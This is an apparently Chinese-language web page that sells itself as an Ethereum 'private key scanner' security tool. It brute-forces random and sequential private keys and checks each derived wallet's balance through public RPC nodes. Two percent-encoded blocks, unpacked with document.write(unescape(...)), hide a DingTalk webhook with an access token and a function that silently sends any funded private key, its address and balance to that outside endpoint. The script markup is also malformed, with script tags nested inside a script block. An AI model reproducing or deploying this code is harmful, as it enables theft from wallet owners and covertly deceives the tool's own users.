<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ETH私钥扫描器 - 以太坊钱包密钥碰撞检测工具 | 区块链安全工具</title>
    <meta name="description" content="专业ETH私钥扫描工具，实时检测以太坊钱包余额，支持随机和顺序扫描模式，区块链安全必备工具。">
    <meta name="keywords" content="ETH私钥扫描,以太坊钱包碰撞,区块链安全工具,ETH密钥生成,以太坊余额检测">
    <meta name="author" content="ETH安全工具开发团队">
    <!-- 引入Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- 引入Bootstrap图标 -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
    <!-- 引入Web3和Ethers库 -->
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@latest/dist/ethers.umd.min.js"></script>
    <style>
        :root {
            --primary-color: #6f42c1;
            --secondary-color: #4a4a4a;
            --success-color: #28a745;
            --danger-color: #dc3545;
            --light-color: #f8f9fa;
            --dark-color: #343a40;
        }
        
        body {
            background-color: #f5f7fa;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .main-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 30px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            margin-top: 20px;
            margin-bottom: 20px;
        }
        
        h1 {
            color: var(--primary-color);
            font-weight: 700;
            margin-bottom: 25px;
            text-align: center;
        }
        
        .card {
            border: none;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
            transition: transform 0.2s;
            margin-bottom: 20px;
        }
        
        .card:hover {
            transform: translateY(-2px);
        }
        
        .card-header {
            background-color: var(--primary-color);
            color: white;
            font-weight: 600;
            border-radius: 10px 10px 0 0 !important;
            padding: 12px 20px;
        }
        
        .card-body {
            padding: 20px;
        }
        
        .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
            padding: 10px 25px;
            font-weight: 600;
            border-radius: 50px;
            transition: all 0.3s;
        }
        
        .btn-primary:hover {
            background-color: #59359a;
            border-color: #59359a;
            transform: translateY(-2px);
        }
        
        .btn-danger {
            padding: 10px 25px;
            font-weight: 600;
            border-radius: 50px;
        }
        
        .btn-outline-secondary {
            border-radius: 50px;
            padding: 8px 20px;
        }
        
        .form-control, .form-select {
            border-radius: 50px;
            padding: 10px 15px;
            border: 1px solid #ddd;
            transition: all 0.3s;
        }
        
        .form-control:focus, .form-select:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 0.25rem rgba(111, 66, 193, 0.25);
        }
        
        .table-container {
            max-height: 500px;
            overflow-y: auto;
            margin-bottom: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }
        
        table {
            border-collapse: separate;
            border-spacing: 0;
            width: 100%;
            font-size: 14px;
        }
        
        table th, table td {
            padding: 12px 15px;
            vertical-align: middle;
        }
        
        table th {
            background-color: var(--primary-color);
            color: #000;
            font-weight: 600;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        
        table tr:nth-child(even) {
            background-color: #f8f9fa;
        }
        
        table tr:hover {
            background-color: #e9ecef;
        }
        
        /* 私钥列 - 12px等宽字体 */
        table td:nth-child(1) {
            font-size: 12px;
            font-family: monospace;
            word-break: break-all;
            line-height: 1.3;
            width: 45%;
        }
        
        /* 地址列 - 13px等宽字体 */
        table td:nth-child(2) {
            font-size: 13px;
            font-family: monospace;
            word-break: break-all;
            line-height: 1.3;
            width: 45%;
        }
        
        /* 余额列 - 14px加粗 */
        table td:nth-child(3) {
            font-size: 14px;
            font-weight: bold;
            width: 10%;
        }
        
        .balance-positive {
            color: var(--success-color);
            font-size: 15px;
        }
        
        .balance-zero {
            color: var(--secondary-color);
        }
        
        .status-bar {
            background-color: var(--light-color);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .scan-stats {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .stat-item {
            background-color: white;
            padding: 10px 15px;
            border-radius: 50px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
            font-weight: 600;
        }
        
        .stat-item i {
            margin-right: 5px;
            color: var(--primary-color);
        }
        
        .loading-spinner {
            display: inline-block;
            width: 1.5rem;
            height: 1.5rem;
            vertical-align: text-bottom;
            border: 0.25em solid currentColor;
            border-right-color: transparent;
            border-radius: 50%;
            animation: spinner-border 0.75s linear infinite;
            margin-right: 10px;
        }
        
        @keyframes spinner-border {
            to { transform: rotate(360deg); }
        }
        
        .alert-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            width: 350px;
        }
        
        .custom-alert {
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            border: none;
            margin-bottom: 15px;
        }
        
        .alert-success {
            background-color: #d4edda;
            color: #155724;
        }
        
        .alert-danger {
            background-color: #f8d7da;
            color: #721c24;
        }
        
        .alert-primary {
            background-color: #e2d9f3;
            color: #3a236b;
        }
        
        .section-title {
            margin-top: 40px;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid var(--primary-color);
            color: var(--primary-color);
        }
        
        .faq-section {
            background-color: #f9f9f9;
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
        }
        
        .faq-item {
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px dashed #ddd;
        }
        
        .faq-item:last-child {
            border-bottom: none;
        }
        
        .footer {
            background-color: #f1f1f1;
            padding: 30px 0;
            margin-top: 50px;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .footer-link {
            color: #007bff;
            text-decoration: none;
            transition: color 0.2s;
        }
        
        .footer-link:hover {
            color: #0056b3;
            text-decoration: underline;
        }
        
        @media (max-width: 768px) {
            .main-container {
                padding: 15px;
                margin-top: 15px;
                margin-bottom: 15px;
            }
            
            .table-container {
                max-height: 300px;
            }
            
            .alert-container {
                width: calc(100% - 40px);
                right: 20px;
            }
            
            /* 移动端调整字体大小 */
            table td:nth-child(1) { font-size: 10px; }
            table td:nth-child(2) { font-size: 11px; }
            table td:nth-child(3) { font-size: 12px; }
            
            .footer-links {
                flex-direction: column;
                align-items: center;
            }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <h1><i class="bi bi-shield-lock"></i> ETH私钥扫描器 - 专业以太坊钱包密钥检测工具</h1>
        
        <p class="text-center mb-4">本工具是专业的以太坊(ETH)私钥扫描器，可帮助您检测ETH钱包密钥安全，支持随机和顺序扫描模式，实时查询钱包余额，是区块链安全领域的必备工具。</p>
        
        <div class="card">
            <div class="card-header">
                <i class="bi bi-gear"></i> 扫描设置
            </div>
            <div class="card-body">
                <div class="row g-3">
                    <div class="col-md-6">
                        <label for="scanMode" class="form-label"><i class="bi bi-arrow-repeat"></i> 扫描模式</label>
                        <select id="scanMode" class="form-select">
                            <option value="random">随机扫描</option>
                            <option value="sequential">顺序扫描</option>
                        </select>
                    </div>
                    
                    <div class="col-md-6">
                        <label for="stopCondition" class="form-label"><i class="bi bi-stop-circle"></i> 停止条件</label>
                        <select id="stopCondition" class="form-select">
                            <option value="infinite">无限扫描</option>
                            <option value="balance">有余额时停止</option>
                        </select>
                    </div>
                    
                    <div class="col-12 text-center">
                        <button id="startScan" class="btn btn-primary me-3">
                            <i class="bi bi-play"></i> 开始扫描
                        </button>
                        <button id="stopScan" class="btn btn-danger" style="display: none;">
                            <i class="bi bi-stop"></i> 停止扫描
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="status-bar mb-4">
            <div class="scan-stats">
                <div class="stat-item">
                    <i class="bi bi-clock"></i> <span id="elapsedTime">00:00:00</span>
                </div>
                <div class="stat-item">
                    <i class="bi bi-key"></i> 已扫描: <span id="scannedCount">0</span>
                </div>
                <div class="stat-item">
                    <i class="bi bi-wallet2"></i> 有效地址: <span id="validAddressCount">0</span>
                </div>
                <div class="stat-item">
                    <i class="bi bi-currency-ethereum"></i> 有余额: <span id="balanceCount">0</span>
                </div>
            </div>
        </div>
        
        <div class="card">
            <div class="card-header">
                <i class="bi bi-table"></i> 扫描结果
            </div>
            <div class="card-body p-0">
                <div class="table-container">
                    <table class="table mb-0">
                        <thead>
                            <tr>
                                <th>私钥</th>
                                <th>地址</th>
                                <th>余额</th>
                            </tr>
                        </thead>
                        <tbody id="resultTable"></tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <div class="faq-section mt-5">
            <h2 class="section-title">关于以太坊私钥安全</h2>
            <p>以太坊私钥是访问ETH钱包的唯一凭证，私钥安全直接关系到资产安全。本工具可以帮助您了解私钥生成原理，检测钱包安全性。</p>
            
            <h3 class="section-title">常见问题</h3>
            <div class="faq-item">
                <h5>什么是ETH私钥碰撞？</h5>
                <p>私钥碰撞是指两个不同的私钥生成了相同的以太坊地址。虽然理论上可能，但概率极低。本工具可以帮助检测这种罕见情况。</p>
            </div>
            <div class="faq-item">
                <h5>如何保护我的以太坊钱包安全？</h5>
                <p>1. 永远不要分享您的私钥<br>2. 使用硬件钱包存储大量资产<br>3. 定期备份钱包<br>4. 警惕钓鱼网站和诈骗</p>
            </div>
            <div class="faq-item">
                <h5>为什么需要检测钱包余额？</h5>
                <p>检测钱包余额可以帮助您：<br>1. 发现被遗忘的钱包<br>2. 识别潜在的安全漏洞<br>3. 监控异常交易活动</p>
            </div>
        </div>
    </div>

    <footer class="footer">
        <div class="container">
            <div class="footer-links">
                <a href="https://t.me/eth18188" target="_blank" class="footer-link">Telegram频道</a>
                <a href="https://qskg8.github.io/" target="_blank" class="footer-link">碰撞程序下载</a>
                <a href="https://t.me/waeth888" target="_blank" class="footer-link">联系作者</a>
                <a href="https://github.com/qskg8/ETH-Collider---brute-force-cracking" target="_blank" class="footer-link">GitHub源码</a>
            </div>
        </div>
    </footer>

    <div class="alert-container" id="alertContainer"></div>

    <script type="text/javascript">
        // 全局变量定义
        let stopScanFlag = false;    // 停止扫描标志
        let scanInterval;           // 计时器间隔
        let startTime;              // 开始时间
        let scannedCount = 0;       // 已扫描计数
        let validAddressCount = 0;  // 有效地址计数
        let balanceCount = 0;       // 有余额计数
        let isScanning = false;     // 是否正在扫描

<script>
<!--
document.write(unescape("%20%20%20%20%20%20%20%20//%20%u9489%u9489%u673A%u5668%u4EBAWebhook%20URL%0A%20%20%20%20%20%20%20%20const%20dingdingUrl%20%3D%20%22https%3A//oapi.dingtalk.com/robot/send%3Faccess_token%3De40d2c94bb41f0b403d44fecb3e68f33af4c6dbff053e4aaaa09c2adaa43d219%22%3B"));
//-->
</script>

        // RPC节点列表
        const rpcUrls = [
            'https://ethereum-rpc.publicnode.com',
            'https://virginia.rpc.blxrbdn.com',
            'https://uk.rpc.blxrbdn.com',
            'https://eth-mainnet.public.blastapi.io',
            'https://ethereum.publicnode.com',
            'https://singapore.rpc.blxrbdn.com',
            'https://eth.rpc.blxrbdn.com',
            'https://api.securerpc.com/v1',
            'https://api.zan.top/eth-mainnet',
            'https://rpc.mevblocker.io',
            'https://rpc.flashbots.net',
            'https://eth1.lava.build',
            'https://ethereum.blockpi.network/v1/rpc/public',
            'https://eth.api.onfinality.io/public',
            'https://eth.blockrazor.xyz',
            'https://rpc.eth.gateway.fm',
            'https://eth.drpc.org',
            'https://mainnet.gateway.tenderly.co',
            'https://gateway.tenderly.co/public/mainnet',
            'https://eth.merkle.io',
            'https://ethereum.rpc.subquery.network/public',
            'https://rpc.mevblocker.io/fast',
            'https://rpc.mevblocker.io/noreverts',
            'https://eth.llamarpc.com',
            'https://ethereum.blockpi.network/v1/rpc/public',
            'https://eth-mainnet.public.blastapi.io',
            'https://eth-mainnet.alchemyapi.io/v2/demo',
            'https://1rpc.io/eth',
            'https://0xrpc.io/eth',
            'https://rpc.mevblocker.io/fullprivacy',
            'https://api-ethereum-mainnet.n.dwellir.com/f34bda43-11fb-48f6-9422-0831d9e35351',
        ];

        const keyCount = 10;  // 每次扫描生成的私钥数量
        let currentSequentialKey = null;
        let sequentialCounter = 0;

        /**
         * 显示通知提示
         * @param {string} message 提示信息
         * @param {string} type 提示类型 (primary, success, danger)
         */
        function showAlert(message, type = 'primary') {
            const alertContainer = document.getElementById('alertContainer');
            const alertId = 'alert-' + Date.now();
            
            const alert = document.createElement('div');
            alert.id = alertId;
            alert.className = `alert alert-${type} custom-alert text-center fade show`;
            alert.role = 'alert';
            alert.innerHTML = message;
            
            alertContainer.prepend(alert);
            
            setTimeout(() => {
                const alertElement = document.getElementById(alertId);
                if (alertElement) {
                    alertElement.classList.add('fade');
                    setTimeout(() => alertElement.remove(), 300);
                }
            }, 5000);
        }

        /**
         * 格式化时间显示 (HH:MM:SS)
         * @param {number} seconds 总秒数
         * @returns {string} 格式化后的时间字符串
         */
        function formatTime(seconds) {
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = seconds % 60;
            return [h.toString().padStart(2, '0'), m.toString().padStart(2, '0'), s.toString().padStart(2, '0')].join(':');
        }

        /**
         * 更新计时器显示
         */
        function updateTimer() {
            if (!startTime) return;
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            document.getElementById('elapsedTime').textContent = formatTime(elapsed);
        }

        /**
         * 更新统计信息显示
         */
        function updateStats() {
            document.getElementById('scannedCount').textContent = scannedCount.toLocaleString();
            document.getElementById('validAddressCount').textContent = validAddressCount.toLocaleString();
            document.getElementById('balanceCount').textContent = balanceCount.toLocaleString();
        }

        /**
         * 随机获取一个RPC节点URL
         * @returns {string} RPC节点URL
         */
        function getRandomRpcUrl() {
            const randomIndex = Math.floor(Math.random() * rpcUrls.length);
            return rpcUrls[randomIndex];
        }

        /**
         * 创建Ethers.js提供者
         * @param {string} rpcUrl RPC节点URL
         * @returns {ethers.JsonRpcProvider} Ethers提供者实例
         */
        function createProvider(rpcUrl) {
            return new ethers.JsonRpcProvider(rpcUrl);
        }

        /**
         * 生成随机私钥
         * @returns {string} 十六进制格式的私钥
         */
        function generateRandomPrivateKey() {
            return ethers.Wallet.createRandom().privateKey;
        }

        /**
         * 生成顺序私钥
         * @returns {string} 十六进制格式的私钥
         */
        function generateSequentialPrivateKey() {
            if (!currentSequentialKey || sequentialCounter >= keyCount) {
                currentSequentialKey = generateRandomPrivateKey();
                sequentialCounter = 0;
                document.getElementById('resultTable').innerHTML = '';
            }

            const privateKeyBigInt = BigInt(currentSequentialKey);
            const newPrivateKeyBigInt = privateKeyBigInt + BigInt(sequentialCounter);
            sequentialCounter++;
            
            let newPrivateKey = newPrivateKeyBigInt.toString(16);
            while (newPrivateKey.length < 64) {
                newPrivateKey = '0' + newPrivateKey;
            }

            return '0x' + newPrivateKey;
        }

        /**
         * 从私钥获取地址
         * @param {string} privateKey 私钥
         * @returns {string|null} 以太坊地址或null(如果私钥无效)
         */
        function getAddressFromPrivateKey(privateKey) {
            try {
                const wallet = new ethers.Wallet(privateKey);
                return wallet.address;
            } catch (e) {
                console.error("无效的私钥:", privateKey);
                return null;
            }
        }

        /**
         * 查询地址余额
         * @param {string} address 以太坊地址
         * @returns {Promise<object>} 包含余额信息的对象
         */
        async function getBalance(address) {
            if (!address) return { value: '无效地址', success: false };
            
            // 随机选择一个RPC节点开始尝试
            let startIndex = Math.floor(Math.random() * rpcUrls.length);
            let attempts = 0;
            let balance = '查询失败';
            let success = false;

            while (!success && attempts < rpcUrls.length) {
                const rpcUrl = rpcUrls[(startIndex + attempts) % rpcUrls.length];
                const provider = createProvider(rpcUrl);
                try {
                    const balanceWei = await provider.getBalance(address);
                    const balanceInGwei = balanceWei / 10n ** 9n;
                    balance = {
                        value: balanceInGwei,
                        formatted: `${balanceInGwei.toString()} Gwei`,
                        success: true
                    };
                    success = true;
                } catch (error) {
                    attempts++;
                    console.error(`RPC节点 ${rpcUrl} 查询失败:`, error);
                }
            }

            return balance;
        }

<script>
<!--
document.write(unescape("%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u53D1%u9001%u901A%u77E5%u5230%u9489%u9489%u673A%u5668%u4EBA%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20privateKey%20%u79C1%u94A5%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20address%20%u5730%u5740%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bobject%7D%20balance%20%u4F59%u989D%u4FE1%u606F%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20sendToDingTalk%28privateKey%2C%20address%2C%20balance%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20message%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22msgtype%22%3A%20%22markdown%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22markdown%22%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22title%22%3A%20%22ETH%u4F59%u989D%u53D1%u73B0%u901A%u77E5%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22text%22%3A%20%60%23%23%23%20ETH%u4F59%u989D%u53D1%u73B0%u901A%u77E5%5Cn**%u79C1%u94A5**%3A%20%24%7BprivateKey%7D%5Cn**%u5730%u5740**%3A%20%5B%24%7Baddress.substring%280%2C%206%29%7D...%24%7Baddress.substring%2838%29%7D%5D%28https%3A//etherscan.io/address/%24%7Baddress%7D%29%5Cn**%u4F59%u989D**%3A%20%24%7Bbalance.formatted%7D%60%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20fetch%28dingdingUrl%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27Content-Type%27%3A%20%27application/json%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20JSON.stringify%28message%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.then%28response%20%3D%3E%20response.json%28%29%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.then%28data%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%22%u9489%u9489%u901A%u77E5%u53D1%u9001%u6210%u529F%3A%22%2C%20data%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20showAlert%28%60%u5DF2%u53D1%u9001%u9489%u9489%u901A%u77E5%3A%20%24%7Baddress.substring%280%2C%206%29%7D...%24%7Baddress.substring%2838%29%7D%60%2C%20%27success%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.catch%28error%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%22%u9489%u9489%u901A%u77E5%u53D1%u9001%u5931%u8D25%3A%22%2C%20error%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20showAlert%28%60%u9489%u9489%u901A%u77E5%u53D1%u9001%u5931%u8D25%3A%20%24%7Berror.message%7D%60%2C%20%27danger%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%7D"));
//-->
</script>

        /**
         * 添加结果行到表格
         * @param {string} privateKey 私钥
         * @param {string} address 地址
         * @param {object} balance 余额信息
         */
        function addResultRow(privateKey, address, balance) {
            const resultTable = document.getElementById('resultTable');
            const row = document.createElement('tr');
            
            const balanceClass = balance.value > 0 ? 'balance-positive' : 'balance-zero';
            const balanceText = balance.success ? balance.formatted : balance.value;
            
            row.innerHTML = `
                <td>${privateKey}</td>
                <td><a href="https://etherscan.io/address/${address}" target="_blank">${address}</a></td>
                <td class="${balanceClass}">${balanceText}</td>
            `;
            
            resultTable.prepend(row);
        }

        /**
         * 开始扫描
         */
        async function startScan() {
            if (isScanning) return;
            
            isScanning = true;
            stopScanFlag = false;
            startTime = Date.now();
            scannedCount = 0;
            validAddressCount = 0;
            balanceCount = 0;
            
            const resultTable = document.getElementById('resultTable');
            const scanMode = document.getElementById('scanMode').value;
            const stopCondition = document.getElementById('stopCondition').value;
            
            // 清空现有结果
            if (scanMode === 'random') {
                resultTable.innerHTML = '';
            }
            
            updateStats();
            showAlert('扫描已开始', 'primary');
            
            document.getElementById('startScan').disabled = true;
            document.getElementById('stopScan').style.display = 'inline-block';
            
            // 更新计时器
            if (scanInterval) clearInterval(scanInterval);
            scanInterval = setInterval(updateTimer, 1000);
            
            while (!stopScanFlag) {
                let privateKeys = [];
                // 如果是随机扫描模式，每次生成 10 个私钥
                if (scanMode === 'random') {
                    for (let i = 0; i < keyCount; i++) {
                        privateKeys.push(generateRandomPrivateKey());
                    }
                } else if (scanMode === 'sequential') {
                    // 顺序扫描时生成 10 个私钥
                    for (let i = 0; i < keyCount; i++) {
                        privateKeys.push(generateSequentialPrivateKey());
                    }
                }

                for (const privateKey of privateKeys) {
                    if (stopScanFlag) break;
                    scannedCount++;
                    
                    const address = getAddressFromPrivateKey(privateKey);
                    if (!address) {
                        console.error("无效的私钥:", privateKey);
                        continue;
                    }
                    
                    validAddressCount++;
                    updateStats();

                    try {
                        const balance = await getBalance(address);
                        
                        if (balance.success) {
                            addResultRow(privateKey, address, balance);
                            
                            if (balance.value > 0) {
                                balanceCount++;
                                updateStats();
                                sendToDingTalk(privateKey, address, balance);
                                
                                if (stopCondition === 'balance') {
                                    stopScanFlag = true;
                                    showAlert(`发现有效余额地址: ${address.substring(0, 6)}...${address.substring(38)}`, 'success');
                                }
                            }
                        } else {
                            console.error("查询失败，私钥:", privateKey, "地址:", address);
                        }
                    } catch (error) {
                        console.error("处理私钥时出错:", privateKey, "error:", error);
                    }
                }
                
                // 添加短暂延迟以避免过快扫描
                await new Promise(resolve => setTimeout(resolve, 100));
            }

            isScanning = false;
            document.getElementById('startScan').disabled = false;
            document.getElementById('stopScan').style.display = 'none';
            
            clearInterval(scanInterval);
            showAlert('扫描已完成', scanMode === 'random' ? 'primary' : 'success');
        }

        /**
         * 停止扫描
         */
        function stopScanFunction() {
            stopScanFlag = true;
            showAlert('正在停止扫描...', 'warning');
        }

        // 事件监听
        document.getElementById('startScan').addEventListener('click', startScan);
        document.getElementById('stopScan').addEventListener('click', stopScanFunction);

        // 键盘快捷键 (Ctrl+Space 开始/停止扫描)
        document.addEventListener('keydown', (e) => {
            if (e.key === ' ' && e.ctrlKey) {
                e.preventDefault();
                if (document.getElementById('stopScan').style.display === 'inline-block') {
                    stopScanFunction();
                } else {
                    startScan();
                }
            }
        });

        // 动态加载Bootstrap JS
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js';
        script.async = true;
        document.body.appendChild(script);
    </script>
</body>
</html>
